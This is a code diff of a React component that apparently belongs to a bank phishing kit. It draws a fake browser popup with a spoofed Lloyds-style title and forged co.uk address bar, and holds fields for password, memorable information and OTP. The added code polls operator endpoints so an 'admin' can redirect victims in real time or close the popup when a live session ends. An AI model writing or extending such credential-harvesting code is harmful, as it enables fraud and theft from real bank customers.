@@ -1,13 +1,12 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useEffect, useState } from "react";
 
 export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOption, logoUrl, onClose, onComplete, customTitle, customDisplayUrl }: any) {
   if (!isOpen) return null;
 
   const displayName = bank?.name || bankName || "Lloyds Bank";
   
-  // 🔥 Admin panel ya bank config se aane wala custom display title aur URL, warna default
   const windowTitle = customTitle || bank?.displayTitle || `${displayName} - Secure Open Banking Portal`;
   const displayUrl = customDisplayUrl || bank?.displayLink || `authorise.${displayName.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user`;
 
@@ -17,7 +16,51 @@ export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOptio
   const [password, setPassword] = useState("");
   const [memorableInfo, setMemorableInfo] = useState("");
   const [otpCode, setOtpCode] = useState("");
-  const [step, setStep] = useState("login"); // login, otp, success
+  const [step, setStep] = useState("login");
+
+  // 🔥 1. Real-time Polling for Admin Redirect Signal
+// 🔥 Admin ka "Redirect Client" click detect karne ke liye polling
+ // 🔥 Final Direct Redirect & Close Fix
+  useEffect(() => {
+    if (!isOpen) return;
+
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/admin/redirect`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data?.redirectUrl && data.redirectUrl.trim() !== "") {
+            // Seedha window location change kar dein taaki popup aur page foran redirect ho jaye
+            window.location.href = data.redirectUrl;
+          }
+        }
+      } catch (err) {}
+    }, 1500);
+
+    return () => clearInterval(interval);
+  }, [isOpen]);
+
+
+
+  // 🔥 2. Session Active Status Check (Agar admin session stop/end karde to client popup khud band ho jaye)
+  useEffect(() => {
+    if (!isOpen) return;
+
+    const checkActiveSession = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/admin/stream`);
+        if (res.ok) {
+          const data = await res.json();
+          // Agar stream active nahi hai ya session terminate ho gaya hai
+          if (data.success === false || !data.frame) {
+            onClose();
+          }
+        }
+      } catch (err) {}
+    }, 3000);
+
+    return () => clearInterval(checkActiveSession);
+  }, [isOpen, onClose]);
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -106,7 +149,7 @@ export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOptio
     <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 p-2 sm:p-6 backdrop-blur-md font-sans select-none">
       <div className="w-full max-w-5xl h-[85vh] bg-zinc-950 rounded-2xl shadow-2xl border border-zinc-800 flex flex-col overflow-hidden">
         
-        {/* Top Window Title Bar - 🔥 Custom Title & Display URL Applied */}
+        {/* Top Window Title Bar */}
         <div className="bg-zinc-900 px-4 py-3 flex items-center justify-between border-b border-zinc-800 shrink-0">
           <div className="flex items-center gap-2">
             <span className="w-3 h-3 rounded-full bg-rose-500 inline-block cursor-pointer hover:opacity-80 transition" onClick={onClose}></span>
